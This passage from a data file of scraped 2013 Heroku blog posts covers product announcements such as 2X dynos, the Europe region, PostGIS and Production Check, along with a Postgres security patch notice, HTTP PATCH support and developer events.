haven’t received an email, drop us a line about Thin to Unicorn or Bamboo to Cedar . 2X dynos: We’re fast-tracking the launch of 2X dynos, to provide double the memory and allow for double (or more) Unicorn concurrency for large Rails apps. This is already available in private beta in use by several hundred customers, and will be available in public beta shortly. New visibility tools: We’re putting more focus on bringing you new performance visibility features, such as the log2viz dashboard , CPU and memory use logging , and HTTP request IDs . We’ll be working to do much more on this front to make sure that you can diagnose performance problems when they happen and know what to do about it. Want something else not mentioned here? Let us know.", "date": "2013-04-03,"},
{"website": "Heroku", "title": "Waza 2013: How Ecosystems Build Mastery", "author": ["Dana Oshiro"], "link": "https://blog.heroku.com/waza_wrap", "abstract": "Waza 2013: How Ecosystems Build Mastery Posted by Dana Oshiro March 20, 2013 Listen to this article When we think of the concept of Waza (技) or \"art and technique,\" it's easy to get caught up in the idea of individual mastery. It's true that works of art are often created by those with great skill, but acquiring that skill is neither solitary nor static. Generations of masters contribute to a canon and it is in that spirit that we built the Heroku platform and the Waza event. This year's Waza was no exception. On February 28th, more than 900 attendees participated in Waza including Ruby founder Yukihiro \"Matz\" Matsumoto , Django co-creator Jacob Kaplan-Moss and Codeacademy’s Linda Liukas . True to form, we offered you a platform for experimentation and you surprised us with your contributions. From your origami creations, to your Arduino hacks, to the technical conversations over craft beer -- you taught us that the definition of software development is ever-evolving. Thank you for allowing us to help you change lives and push boundaries. We will continue our commitment to growing the platform for you and look forward to collaborating with you in the future. For more event highlights visit the Waza videos and photos . To learn more about Heroku, add yourself to our mailing list . ruby events matz waza Waza waza2013 heroku python ruby on rails san francisco", "date": "2013-03-20,"},
{"website": "Heroku", "title": "2X Dynos in Public Beta", "author": ["Nicolas Pujol"], "link": "https://blog.heroku.com/2x-dynos-beta", "abstract": "2X Dynos in Public Beta Posted by Nicolas Pujol April 05, 2013 Listen to this article A dyno , the unit of computing power on Heroku, is a lightweight container running a single user-specified command. Today we’re announcing a dyno with twice the capacity: 2X dynos. Existing dynos are now called 1X dynos. They come with 512MB of memory and 1x CPU share. They cost $0.05/hr. 2X dynos are exactly what their name implies: 1GB of memory and twice the CPU share for $0.10/hr. To support the growth of current and future apps on the platform, you can now control your dyno resources on two axes: size and quantity. Let’s try them out. Getting started with 2X dynos Using the Heroku Toolbelt , resize your dynos with the resize command: $ heroku ps:resize web=2X worker=1X\nResizing dynos and restarting specified processes... done\nweb dynos now 2X ($0.10/dyno-hour)\nworker dynos now 1X ($0.05/dyno-hour) To view the dyno size of a process type, use the ps command: $ heroku ps\n=== web (2X): `bundle exec unicorn -p $PORT -c ./config/unicorn.rb`\nweb.1: up 2013/03/27 14:27:58 (~ 6h ago)\nweb.2: up 2013/03/27 14:47:04 (~ 6h ago)\nweb.3: up 2013/03/27 15:08:23 (~ 5h ago)\n\n=== worker (1X): `bundle exec rake worker:job`\nworker.1: up 2013/03/27 14:39:04 (~ 6h ago)\nworker.2: up 2013/03/27 15:08:24 (~ 5h ago)\nworker.3: up 2013/03/27 14:30:55 (~ 6h ago) Using the Dashboard use the app’s resources page: For full instructions, see the Dev Center article . Use Cases You can already scale horizontally, adding more dynos with heroku ps:scale . When you want to scale vertically instead, use larger dynos with heroku ps:resize . 1. Concurrency for Rails with Unicorn - The first use case is increasing concurrency on single-threaded Rails apps using Unicorn. Due to the improved in-dyno queuing efficiency that results from increasing the number of Unicorn workers, doubling the workers in 2X dynos while halving the dyno count often results in better performance. 2. JVM Languages - The modern JVM has an explicit memory model designed for multi-threaded concurrency, and has many frameworks explicitly designed to take advantage of this property. Utilizing more threads requires more memory for both the thread stacks and for objects created by these threads. The JVM is fully capable of taking advantage of the vertical scale in a 2X dyno. 3. Memory-intensive background jobs - image processing and geospatial processing often need larger dynos. If you’ve gotten an R14 out-of-memory error and this is not a leak, 2X dynos might be for you. Horizontal vs. Vertical Scale 2X dynos give you a new knob to turn: vertical scale. Vertical scaling is appealing when the consolidation of compute power and memory increases overall performance. This can translate into better app performance at the same cost, and possibly lower costs if the set of dynos can be reduced by more than half. It's impossible to make blanket statements about app performance due to each app's unique performance characteristics. I/O-bound apps may not benefit from an increase in memory and compute, while process-heavy apps would. The best way to determine in what configuration your app runs best is to measure it. Heroku provides several tools to help you understand your application's behavior. Use log2viz to understand how much memory and CPU is being consumed by your current app/dyno configuration. If the memory usage or web dyno activity indicators are close to their limits, 2X dynos may provide much-needed increase in resources. The latest New Relic add-on accurately displays request queue times and can be used to visualize the impact a higher-concurrency configuration has on your app. Use 2X dynos to double your in-dyno Unicorn workers and mitigate inconsistent and variable queue times. Summary Through the duration of the beta period, 2X dynos will cost the same as 1X dynos, that is $0.05 per hour. Once generally available they will cost $0.10 per hour. If you’re looking to improve concurrency on Rails apps, making use of JVMs or other memory-hungry tasks, 2X dynos have a lot of potential to make apps faster. Give them a try. FAQ How can I measure how much memory my dynos are using? The log-runtime-metrics Labs feature provides logged metrics that can be consumed and inspected with an add-on that consumes logs such as Papertrail, or displayed by a visualization tool like log2viz. How do 2X dynos affect the 750 free dyno hours? 2X dynos consume twice as many free dyno-hours per hour as 1X dynos. Example: A 2X one dyno app will run for free for 375 hours compared to 750 hours for a 1X one dyno app. Do single 2X dyno apps idle? Yes. Idling affects single 1X and 2X dyno apps alike. Can dyno size be configured on a per process-type basis? Yes. Dyno size can be applied on a per process-type basis. For example: heroku ps:resize web=2X worker=1X worker2=2X Can I get 4X (or larger) dynos? We are exploring the option. If you have an app that may need these, send us a note .", "date": "2013-04-05,"},
{"website": "Heroku", "title": "Heroku Postgres Databases Patched", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/postgres_security_updates_and_your_heroku_postgres_database", "abstract": "Heroku Postgres Databases Patched Posted by Craig Kerstiens April 04, 2013 Listen to this article Heroku Postgres Databases have been patched Data is one of the most valuable assets of any company. As a database-as-a-service provider, one of our biggest responsibilities is ensuring your data is kept safe. A few weeks ago, one of the worst security vulnerabilities to date in PostgreSQL was discovered . To address this issue, Heroku deployed a point release upgrade across the entire Heroku Postgres service earlier this week. This resulted in a period of database unavailability, typically with a duration of less than one minute. Every database running on Heroku Postgres is now appropriately patched and is unaffected by the vulnerability. PostgreSQL Vulnerability Details The PostgreSQL project has provided official detail on CVE-2013-1899 . Several weeks ago there was a responsible disclosure of a serious security vulnerability within PostgreSQL by Mitsumasa Kondo and Kyotaro Horiguchi . The vulnerability allows unauthenticated remote users to use the ‘postmaster‘ process to write data to any accessible file, including critical internal database files. The vulnerability was fixed and then committed to the PostgreSQL’s private git repository , but only after updates to anonymously accessible copies were disabled . Updated versions of PostgreSQL were released today to most large packaging repositories, as well as source code and installers. Heroku Postgres Patching The Heroku Postgres team worked with the PostgreSQL community to ensure we would be able to rapidly apply this patch. However, due to the nature of the issue, and aiming to mitigate risk for others, we were not able to discuss specifics until now. Our goal — in addition to ensuring your data was safe — was to continue monitoring this upgrade as it was deployed, providing early feedback to the community should bugs be found, and not jeopardizing in any way the coordinated public disclosure process stewarded by the PostgreSQL community. Most importantly, the PostgreSQL source code that included the patch was held in the utmost secrecy. In addition, the deployment plan was reviewed by PostgreSQL community members in advance. Once the source code was released to the PostgreSQL packagers—of which a member of the Heroku Postgres staff is a part of—we began applying this patch to all Heroku Postgres databases, with the first updates starting on Monday. As of Wednesday at 6:30 PM PDT, all Heroku Postgres databases had been upgraded to their appropriate point release and were no longer vulnerable to CVE-2013-1899 . Conclusion We realize that having no control over a maintenance window, however brief, is among the worst possible experiences. We are very sorry. Two reasons prevented us from working with you to schedule the security update. First, we prioritize ensuring your data is safe above all else, as a result making sure that every database was patched before this exploit was weaponized was paramount. Secondly, this was the first time we've had to deal with a security update of this scale, and have no machinery in place to schedule upgrades of this sort. Spending time to build such machinery would have prevented us from having every database patched in time. We will continue to work on improving our process around such maintenance to provide a better experience in the future. As of late Wednesday all Heroku Postgres databases were upgraded and no longer at risk of CVE-2013-1899 . No further action is required on your part to ensure your data remains safe. postgres", "date": "2013-04-04,"},
{"website": "Heroku", "title": "Empowering Change: Programming Literacy for All", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/heroku_in_the_classroom_ut_on_rails", "abstract": "Empowering Change: Programming Literacy for All Posted by Richard Schneeman April 12, 2013 Listen to this article There has never been a better time to be a programmer. Every day more and more gadgets get connected or over-clocked . Programming is so prevalent that it often goes unnoticed in our daily lives. Whether we're scripting out social presence with IFTTT , or doing taxes with Excel, automation and programming has become an inescapable part of the modern world. Heroku believes that to invest in our future, we must invest in programming literacy . While we're waiting for recursion to be a staple in our children’s classrooms,  we can work on continuing and higher education today. Heroku engineers are given opportunities and encouragement to be part of this movement. They’ve done so through supporting and participating in a number of groups including Hungry academy , Rails Girls , PyLadies , and more. As a Heroku engineer I had a recent opportunity to teach a class in Ruby on Rails at the University of Texas in Austin. While nothing beats an in-classroom experience, it's not modular or scalable. In an effort to further scale programming literacy, we’ve been working to make this content available for everyone. After many re-takes, re-writes and hours of editing, we are happy to provide you with over 40 hours of video, lectures, exercises and quizes for free: Heroku Presents: UT on Rails . The course will take a brand new developer up through the ranks, until they can build and deploy a fully functional website. If you or someone you know is interested in learning web programming, it's a great opportunity. Staying Connected At Heroku, we are encouraged to get involved with our respective communities. While we dogfood our product on a daily basis, there is no substitute for seeing how other developers actually work with it. Developers don't have to teach a full length course to get involved with their communities. We've had developers help out at a number of community sponsored events that focus on getting more people engaged with technology. One of them, Rails Girls , has been so successful that we've had engineers participate at events in over 6 different countries. Terence Lee at Rails Girls Amsterdam, photos by: Konstantin Haase By staying connected, we help a new generation of programmers while making our own products better. It's a win-win situation. Feedback Cycles Learning is a feedback loop. You take an action, see the result, learn a lesson. The smaller the loop, the less time from action to result: the quicker you learn, the faster you advance. For students, using Heroku means they can spend less time worrying about their production environments and more focusing on their application logic. Millions of application developers choose Heroku to get their features to market as quickly as possible. It's that same speed of delivery and deployment that also makes Heroku a natural choice for beginners. The Next Generation As we move further into an ever-connected society, developers and companies must do their part to promote programming and technology in the classroom. While the demand for tech jobs seems to be constantly increasing, where will tomorrow's senior developers come from? Perhaps they will come from programs like Let’s Learn Python at this years PyCon or through intensive focus courses like those offered by gSchool , or perhaps from general education courses. Wherever the next generation of programmers comes from, we want to set them up to succeed. Heroku has always had a free tier which is perfect for prototyping and learning. Putting the right tools in a student’s hands can empower them to succeed. If you are picking up web development or know someone who is, consider introducing them to this Rails course and volunteering to help mentor them. The reward is far greater than the effort. If you're teaching technology or programming and are using Heroku, we want to get to know you better. Please reach out and contact us , we're interested in your story. Help us invest in programming literacy, and make the future a better place.", "date": "2013-04-12,"},
{"website": "Heroku", "title": "Expanded HTTP Method Support", "author": ["Blake Gentry"], "link": "https://blog.heroku.com/expanded_http_method_support", "abstract": "Expanded HTTP Method Support Posted by Blake Gentry April 20, 2013 Listen to this article HTTP and its secure variant, HTTPS, are the protocols used by every web\nclient to talk to web applications. A key part of the protocol is the HTTP\nmethod . Traditionally, web applications used a very limited set of HTTP\nmethods. It is common for application servers, proxies and routers (such as the\nHeroku HTTP router) to prevent unknown methods from being used. This unnecessary\nconstraint of the Heroku HTTP router has increasingly become a limitation to\ndevelopers building modern web applications. In the past, if you tried to use an unsupported HTTP method in your Heroku\napplication, clients would receive a 405 METHOD_NOT_ALLOWED error. As of today, that's no longer the case. The Heroku routers now accept any HTTP\nmethod , allowing you to use newer methods that have recently\ngained adoption, such as PATCH . Why is this important? Many new web frameworks use recently introduced HTTP methods such as PATCH or\neven custom methods that are not yet standardized. Ruby on Rails is one such\nframework. Rails has constantly evolved since its birth to always incorporate\nthe latest development techniques. One such evolution is happening in Rails\n4 where the framework uses the PATCH HTTP method to perform\npartial updates of resources . Before Heroku removed restrictions on HTTP method, it was not possible to\nleverage this new functionality in Rails 4. Now that any method is supported,\nyou can take full advantage of PATCH support in Rails 4. Background For the curious, a little more background is in order. HTTP is extensible A huge factor in HTTP's popularity has been its extensibility. HTTP is a simple\nprotocol that can be used for many different purposes. For instance, the HTTP/1.1 Spec defines the following set of methods: OPTIONS , GET , HEAD , POST , PUT , DELETE , TRACE , CONNECT . But the spec also states that new methods can be added. In fact, a number of\nother RFCs have standardized additional HTTP methods, often for specific\napplications such as version control or calendaring. Yet in most cases,\nregardless of the underlying application, developers can leverage the same\nsupporting infrastructure: load balancers, proxies, caching proxies; all\ndesigned for HTTP. The HTTP PATCH Method A recent extension to HTTP is RFC5789 , which introduced the PATCH method. This method is particularly useful for web application developers, as it\nstandardizes a common way to make partial updates to resources. Rails 4 and many\nother libraries now make use of it. We can quickly demonstrate how it is used by deploying a basic Sinatra app to\nHeroku using the quick start guide . Replace the code in app.rb with: require 'sinatra'\nrequire 'json'\n\nclass App < Sinatra::Base\n\n  # fake persistent data.\n  DATA = { \"a\" => 1, \"b\" => 2, \"c\" => 3 }\n\n  put '/data' do\n    # put replaces the existing resource so we simply return the new resource\n    new_data = JSON.parse(request.body.read)\n    new_data.to_json\n  end\n\n  patch '/data' do\n    # patch 'patches' the existing resource\n    new_data = DATA.merge(JSON.parse(request.body.read))\n    new_data.to_json\n  end\n\nend Once your app is deployed, perform a PATCH and PUT request with curl: $ curl -X PATCH http://shiny-object-1234.herokuapp.com/data -d '{\"a\": 2, \"b\": 3}'\n{\"a\":2,\"b\":3,\"c\":3}\n$ curl -X PUT http://shiny-object-1234.herokuapp.com/data -d '{\"a\": 2, \"b\": 3}'\n{\"a\":2,\"b\":3} The PATCH logic merges the new values into the existing data structure and\nreturns the whole data structure, whereas PUT simply replaces the old data\nstructure with a new one. While this example doesn't persist the changes, it\ndemonstrates the semantic difference between these two HTTP methods. Other HTTP methods PATCH is just one example of how a new HTTP method was defined, standardized\nand successfully achieved widespread use. Because Heroku no longer imposes any\nrestrictions on HTTP methods, future extensions will work seamlessly without\nrequiring explicit support. This also means that the Heroku platform can be used\nas a proving ground for new, non-standardized HTTP methods. Why restrict HTTP methods in the first place? The original motivation for application servers, proxies and HTTP routers to\nrestrict HTTP methods was that these intermediaries often performed more\nfunctions than just passing through requests. For example, if an intermediary\nwants to retry a failed request, it needs to understand whether a retry is safe. POST and PATCH requests are generally not safe to retry while GET , PUT , and DELETE are. Heroku's routers pass requests straight through to the application, without\nspecial handling based on the particular HTTP method; the routers therefore\nhandle all requests the same, regardless of which method was used. This results\nin maximum flexibility for the application developer to use any HTTP method and\nfully control the semantics of each request. For more on HTTP routing visit our Dev Center article .", "date": "2013-04-20,"},
{"website": "Heroku", "title": "Postgres Version 9.2 is now Default", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/postgres_92_now_default", "abstract": "Postgres Version 9.2 is now Default Posted by Craig Kerstiens April 18, 2013 Listen to this article Over a year ago we began working with the community as to how we could help to make Postgres better. Much of this came to fruition with PostgreSQL version 9.2 and three months ago we released support of Postgres 9.2 into GA. We've now seen many users begin taking advantage of the powerful features in this version including: Better visibility with pg_stat_statements URL support JSON datatype and more In these three months the 9.2 PostgreSQL version has had time to bake including several minor updates fixing a variety of bugs. Today as a result of all of this we're making 9.2 the default version when you provision a Heroku Postgres database. In addition to making 9.2 our new default we've end of lifed both version 8.3 and 8.4. To provide further detail around this we've documented our version policy for Postgres versions within the Dev Center . Provision your 9.2 database today to get started using many of these exciting new features. postgres", "date": "2013-04-18,"},
{"website": "Heroku", "title": "Introducing the Europe Region, Now Available in Public Beta", "author": ["Zeke Sikelianos"], "link": "https://blog.heroku.com/europe-region", "abstract": "Introducing the Europe Region, Now Available in Public Beta Posted by Zeke Sikelianos April 24, 2013 Listen to this article Today we’re happy to announce Heroku’s Europe region, available in public beta. With more than 3 million apps running on our platform from developers all over the globe, it's not surprising that we've had high demand for Heroku in more regions of the world. After collaborating closely with customers during private beta, we're now ready to offer Heroku services in Europe to all customers as part of a public beta. The Europe region runs Heroku applications from datacenters located in Europe, offering improved performance for users in that region. One Heroku, Two Continents The Europe region offers all the features of the existing US region. Both regions run apps on infrastructure dedicated to each region, but are managed by the same unified Heroku interface you already know. This provides powerful global app management with isolated, geolocated infrastructure: Faster Apps The physical proximity of the Europe region to European end-users means reduced latency, often resulting in a dramatic improvement in app responsiveness to those users. We’ve observed performance improvements of 100ms per request or more for European end-users: A Familiar Workflow All Heroku users can now create and deploy apps to the Europe region: $ heroku create --region eu\n$ git push heroku master Once the app is created, you can interact with it just like any other Heroku app. Easy App Migration with Heroku Fork To ease the process of migrating existing applications to the Europe region, we created heroku fork , a new addition to the Heroku CLI. Heroku fork copies an app's Heroku Postgres data and config vars, and re-provisions all its add-ons. If you have an existing app you’d like to run in the Europe region, check that you’ve got the most recent Heroku toolbelt installed and use Heroku fork to create a running copy of your app in the new region: $ heroku fork --region eu\nCreating fork myapp-332... done\nCopying slug... done\nAdding newrelic:professional... done\nCopying config vars... done\nFork complete, view it at http://myapp-332.herokuapp.com/ Note: heroku fork will not move any domains or scale your app past a single dyno, so you're free to decide when your app will be made available to your customers. For more information about this powerful new feature, see the Dev Center article on heroku fork . Add-ons More than 60 add-ons are currently available in the Europe region, with more on the way. To ensure that your app has fast access to its data wherever it’s deployed, Heroku automatically provisions latency-sensitive add-ons in your app’s region. Many add-ons are already available to apps in the Europe region, including: Heroku Postgres MongoLab Memcachier openredis New Relic Websolr Scheduler Deploy Hooks SendGrid Airbrake Papertrail ClearDB To discover which add-ons are available in the Europe region, search for 'europe' on the addons homepage or use the new --region flag in the heroku CLI: $ heroku update\n$ heroku addons:list --region eu Customer Success Several Heroku customers have already deployed their production Heroku apps to the Europe region for improved performance. For example, top Swedish television network TV4 is currently running its video on demand service TV4 Play out of Heroku’s Europe region. TV4 CTO Per Åström says: Deploying our app closer to our users in Heroku's Europe region gave us a 150ms improvement in web performance. Based on this win for our users, we’re moving all of our apps to the Europe region. Digital agencies and other customers delivering user-facing mobile and social apps have also benefited from improved performance in the Europe region. For example, app development company Betapond COO Conor Ryan says: Deploying our Facebook apps live to the Heroku cloud in the EU was pain-free and as easy as staging. We're delighted to see an average of 11% improvement in page load times since making the switch. Consumers don't tolerate waiting, particularly on mobile devices, so Heroku's EU contribution to a snappy user experience is a big boost for Betapond and our customers. Safe Harbor Compliance This section was updated August 2014. To give our customers the highest level of confidence about the protection of their data, Heroku has certified with the U.S.-EU Safe Harbor Framework and the U.S.-Swiss Safe Harbor Framework as set forth by the U.S. Department of Commerce and the European Union. This ensures that companies who have a European customer base can build apps on Heroku that comply with EU's data protection laws. Your application does not need to be deployed in the EU region to be in compliance. The certification covers both the EU and US region. Check our privacy statement and our entry on export.gov for more information about the scope. We Want Your Feedback If you have comments or questions about the Heroku Europe region, email us at eu-beta@heroku.com .\n  To receive email updates about the Heroku Europe region as it progresses to general availability, subscribe to the beta mailing list below. Additional Resources Screencast: Introducing Regions Dev Center: Regions Dev Center: Configure SSL for Europe Region Apps Dev Center: Production Tier Postgres Database Migration Dev Center: Starter Tier Postgres Database Migration", "date": "2013-04-24,"},
{"website": "Heroku", "title": "Introducing Production Check", "author": ["Jonathan Clem"], "link": "https://blog.heroku.com/introducing_production_check", "abstract": "Introducing Production Check Posted by Jonathan Clem April 26, 2013 Listen to this article Entering production is a key transition in your app’s lifecycle; it signals that your app will be delivering value to end users. You are no longer optimizing for testing—you are optimizing for performance and reliability, and there are new factors to consider at this stage. Today we’re announcing Production Check , an enhancement to the Heroku Dashboard that helps ensure that your app is ready to go to production. Production Check tests your app’s configuration against a set of optional—but highly recommended—criteria. It makes it easy to ensure that your app’s configuration lends itself to maximum uptime. Moreover, it ensures that you have tools available for understanding and monitoring the factors that contribute to uptime. How to Check Your App To run Production Check, click the “Run Production Check” link in the header for any app in the Heroku Dashboard. Production Check will run a series of tests on your app that we recommend for maintaining and monitoring availability. Each check includes useful links to the Heroku Dev\nCenter and other related resources. Let’s look at a few of the areas it focuses on: DNS Configuration Previously, it was recommended to point your app's DNS directly to Heroku's three provided IP addresses. Now, the Cedar stack allows you to point your app to app-name.herokuapp.com or a *.herokussl.com domain rather than a legacy IP address. This ensures that in the event of an infrastructure-level issue, core components can be replaced without requiring you to make changes to your apps. Dyno Redundancy Although an app may not require the resources of more than a single dyno, we recommend running at least 2 dynos for a production app. One reason for this is that dynos restart roughly every 24 hours , and dyno redundancy helps ensure that you don't experience excessive queueing or dropped requests while a single dyno restarts. Additionally, dynos and the processes running on them can occasionally crash, and having another dyno helps ensure that you don't have downtime while that dyno recovers. Finally, single web dynos sleep after an hour of\ninactivity , and having a second dyno means that all dynos will stay awake. App Monitoring Inevitably, performance issues and downtime occur. It’s important to have tools available that monitor how often and why it happens to your app. New Relic is a great tool for getting immediate, specific visibility into your app’s performance and availability. Not sure why a specific action takes so long in your app? New Relic can help you identify the specific line of code responsible for\nthe slowness. Log Monitoring While New Relic gives you visibility into factors that contribute to downtime and performance issues, it’s important to have log-monitoring tools like Papertrail to monitor for events more specific to your app—for example, you might want to be alerted if there’s a sudden spike in failed credit card authorizations. While Heroku’s log for your app only goes back 1500 lines (which for a large production site may only represent seconds of activity), these add-ons also allow you to search days or weeks back through your app’s logs, allowing you to understand the context in which an error occurred. Let Us Know What You Think Heroku defines a “production app” as an app with 2 or more dynos and a production-tier Postgres database (if one is present). While far from exhaustive, the tests Production Check provides give additional guidance in getting you and your app prepared to handle the challenges your app will face as it moves into production. With Production Check, you can save time in getting apps ready for launch day while learning best practices on Heroku. Go to the Heroku Dashboard now and give it a try. If you have questions or comments about Production Check, email us at dashboard-feedback@heroku.com .", "date": "2013-04-26,"},
{"website": "Heroku", "title": "RailsConf 2013", "author": ["Terence Lee"], "link": "https://blog.heroku.com/railsconf_2013", "abstract": "RailsConf 2013 Posted by Terence Lee April 26, 2013 Listen to this article Developers are worthy of great experiences and at Heroku we aim to help improve this. Whether its making it easier to prepare your application for production on Heroku, not having to worry about security updates in your database , or getting notified of the latest rails vulnerability we want to make the world better for developers. This extends beyond the Heroku platform as well. For instance, our Ruby Task Force contributes back to projects like Ruby on Rails , Bundler , Code Triage , and Rails Girls . Likewise, we aim to do everything we can to make your RailsConf experience better. Whether it is relaxing with some sake or getting performance advice for your application, we have a slew of activities planned for the conference: Performance Bar - Over the last month, we have been helping customers with Bamboo to Cedar migrations, visibility tooling, and scaling. We are bringing this white glove service to RailsConf. Heroku Engineers will be at our booth to help with your PostgreSQL database, better introspection, and any other issue to help improve your app for deployment. The Performance Bar will be open during Expo Hall hours on Tuesday and Wednesday at our booth. Feel free to walk up and get one-on-one help from a Heroku Engineer or preschedule an appointment by emailing tammy@heroku.com . Performance Workshop - We're partnering with our good friends, JumpStart Lab , to run a free Performance Workshop on Wednesday evening at 6:30pm in room D136 at the Portland Convention Center. Get hands on performance tips and then test your knowledge afterwards in an application performance tuning contest. We'll hand out prizes for the fastest times. It's free to sign up ! If you can't make it to RailsConf, you can check out the livestream . Sake Happy Hour - On Tuesday and Wednesday from 3-4 pm we'll be hosting a Sake Happy Hour at our booth complete with a limited supply of Heroku shot glasses each day. Come celebrate and talk shop with Heroku Engineers. Sessions - There will be two talk sessions given by Heroku Engineers. On Tuesday, April 30th, 2:50 pm in the P&S Room Terence Lee will be talking about Forget Scaling: Focus on Performance . On Thursday, May 2nd, 11:20am in Room 252+253 Richard Schneeman will be talking about Dissecting Ruby with Ruby . We're looking forward to being a part of your RailsConf experience. If you have feedback on how we can improve further please reach out to us.", "date": "2013-04-26,"},
{"website": "Heroku", "title": "New Dyno Networking Model", "author": ["Michael Friis"], "link": "https://blog.heroku.com/new_dyno_networking_model", "abstract": "New Dyno Networking Model Posted by Michael Friis May 02, 2013 Listen to this article Today we're announcing a change to how networking on Heroku works. Dynos now get a dedicated, virtual networking interface instead of sharing a network interface with other dynos. This makes dynos behave more like standard unix containers resulting in better compatibility with application frameworks and better parity between development and production environments . Background Previously, network interfaces were shared between multiple dynos. This weakened the abstraction of a dyno as a standard Unix-style container with a network interface of its own and full disposal of the whole TCP port range. The shared network interface also resulted in a low grade information leak where one dyno could obtain some information about connections made by other dynos. This information did not include any customer data or other customer identifying information. But it broke the core principle of tenant isolation. With the new networking model, dynos now have fully isolated network configurations. We’d like to thank John Leach for working with us to analyze this aspect of our old networking model and point out the weakness. Networking improvements We want the Heroku dyno to resemble a standard OS environment as much as possible, except you don't have to manage anything yourself. A dyno should let you instantly run any application that you can run on another reasonable unix-style system. The new dyno networking model brings us closer to that goal: The dyno no longer imposes any restrictions on what ports an application can listen on. This improves out-of-the box compatibility with application frameworks that listen on multiple ports (for whatever reason). You can still only connect from the outside world to the port specified in the $PORT environment variable, but now you don't have to painfully reconfigure your web stack to stop it from listening on other ports. In other words, if it worked on your local environment, there is now one less reason it might break on Heroku. Challenges You are not required to make any changes to your applications to make it work with the new configuration. We have gradually rolled out the networking update over the last month and at this point it is the default for all new and existing applications. Along the way we ran into some interesting problems in the underlying stack. Some library code behaves in unexpected ways when running on an OS with a high number of virtual network interfaces. For example, listing network interfaces in Java using OpenJDK fails if any one network interface's index is greater than 255. We identified this problem during the gradual rollout and updated the buildpacks with a custom patched OpenJDK build so your applications would not be affected. One problem we're still working on resolving is that Raindrops is not functional with the new networking stack. This is due to a Linux kernel bug . The bug has been addressed in the upstream kernel sources, but we’re still waiting for it show up in the branch that Heroku runs. Check the Dev Center article on dynos for additional details.", "date": "2013-05-02,"},
{"website": "Heroku", "title": "Building Location Based Apps with Heroku PostGIS", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/building_location_based_apps_with_postgis", "abstract": "Building Location Based Apps with Heroku PostGIS Posted by Craig Kerstiens April 30, 2013 Listen to this article Smartphones have changed the world – everyone has a device in their pocket that’s constantly connected to the internet and knows where you are. Combined with the rise of digital mapping it has become commonplace to build applications that use GIS (Geographical Information Systems) to digitally represent our physical reality and our location in it. Storing and manipulating geospatial data has become an essential part of application development. If you are building a mobile app it’s becoming table stakes that you take advantage of location . Today we’re releasing PostGIS 2.0 into public beta as an extension to Heroku Postgres. Now all Heroku Postgres customers will be able to store and manipulate geospatial data as part of their Postgres database. PostGIS 2.0 capabilities are now available in all production tier plans at no additional charge—allowing you to add powerful location functionality to your application. PostGIS 2.0 will enable a new class of Heroku applications that leverage location data. Whether you are looking to compute walkability scores to nearby schools , target ads based on GPS locations , or search for apartments by specific neighborhoods PostGIS can help make you build richer functionality into your application more easily. PostGIS now follows the standard extension format within Heroku Postgres. Installing PostGIS is as simple as create extension postgis on any new Postgres 9.2 database crane and above. This means that you can continue starting small with your application, grow functionality, then enable PostGIS at any time to begin taking advantage of it . Get Started You can get started with PostGIS 2.0 today by provisioning a database then enabling the extension; or read more about what PostGIS provides . To provision your database: heroku addons:add heroku-postgresql:crane Once provisioned you’ll want to connect to it and enable the extension: $ heroku pg:psql\ncreate extension postgis; Your geospatial database is now enabled and ready to use. More about PostGIS PostGIS is an extension, adding support for geographic objects and working with them, within PostgreSQL. Similar to PostgreSQL itself, PostGIS is open source. Since Heroku Postgres runs unmodified from the main branch you always use standard technology. The technology is flexible and there is no technology lock-in – you can take data in and out at any time. PostGIS has grown over several years with a large community behind it now supporting a variety of new operators , specialized types , and a long list of functions for interacting with spatial data . Adding Location to App While SQL and specifically PostgreSQL can perform basic algebra this method quickly hits limitations when it comes to more complex location searching. Understandably there’s value in providing your users with richer functionality such as searching by neighborhood, by radius of proximity, or by routes versus just direct distance. At PyCon 2013 Julia  Grace talked about how some developers use various math tricks to compute distances or you can take an easier approach by using PostGIS . By using PostGIS whether natively or through Rails with ActiveRecord , Django with GeoDjango , Hibernate you can add a variety of rich functionality around location and geographic data very quickly, including: High performance point-in-polygon testing, using ST_Intersect. Native support for distance and area calculations on the spheroid, using the geography column type . Index-accelerated nearest-neighbor (KNN) searching . Support for server-side map rendering from a number of open source mapping engines – http://geoserver.org , http://mapserver.org , and http://mapbox.com To begin taking advantage of the GIS functionality available within your Heroku Postgres database read more in Dev Center on getting it setup with ActiveRecord for Rails or within GeoDjango . Summary Heroku Postgres is increasingly enabling rich use cases – adding services from key/value datatype in hstore , querying across postgres databases with dblink , and now adding rich geospatial functionality . Adding PostGIS within your Postgres database reduces the number of services you need to add to your stack, reducing complexity and allowing you to build in location-based functionality into apps faster. Get started integrating location into your apps today by provisioning your Heroku Postgres database and exploring the functionality of PostGIS 2.0 . postgres", "date": "2013-04-30,"},
{"website": "Heroku", "title": "London Fork-a-thon", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/london_fork_a_thon", "abstract": "London Fork-a-thon Posted by Sara Dornsife May 06, 2013 Listen to this article On 15 May, join Heroku for the London Fork-a-thon, a hack-a-thon-like event (hands-on and live coding), where Heroku engineers will be available to answer any questions you might have regarding Heroku in Europe, and to help you to fork your app to the Europe region. Space is limited, register now . Heroku just announced the release of the Heroku Europe region in public beta. The Europe region runs apps from datacenters located in Europe and offers increased performance for customers located in that region. We're calling this a \"fork-a-thon\" because fork is the fastest way to move your app to the Europe region. Heroku fork allows you to copy an existing application, including add-ons, config vars, and Heroku Postgres data. Utilizing fork, you can deploy a copy of your app to the Europe region to give your end-users increased app performance. Come fork your app and see the kind of gains you can get for your users. Date: 15 May 2013 Location: LBi 146 Brick Lane E1 6RU London Agenda: 5:00 - 5:45 p.m. Heroku Presentation 5:45 - 6:00 p.m. Q&A 6:00 - 8:00 p.m. Engineer-assisted working session with food and drinks Register Now: This is a free hands-on event, so please bring a laptop. Space is limited, reserve your space today . Regards, The Heroku Team", "date": "2013-05-06,"},
